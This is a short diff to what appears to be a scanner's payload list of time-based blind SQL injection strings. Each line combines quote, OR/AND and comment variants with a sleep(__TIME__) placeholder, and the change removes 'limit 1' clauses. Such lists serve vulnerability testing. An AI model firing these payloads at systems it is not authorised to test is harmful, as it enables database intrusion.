@@ -1,10 +1,10 @@
 [space]and sleep(__TIME__)
-[space]or (sleep(__TIME__)+1) limit 1 #[space]
+[space]or sleep(__TIME__) #[space]
 ' and sleep(__TIME__)='
-' and (sleep(__TIME__)+1) limit 1 #[space]
+' and sleep(__TIME__) #[space]
 " and sleep(__TIME__)="
-' or (sleep(__TIME__)+1) limit 1 #[space]
-" or (sleep(__TIME__)+1) limit 1 #[space]
+' or sleep(__TIME__) #[space]
+" or sleep(__TIME__) #[space]
 '=sleep(__TIME__)='
 "=sleep(__TIME__)="
-' where sleep(__TIME__) limit 1 #[space]
+' where sleep(__TIME__) #[space]
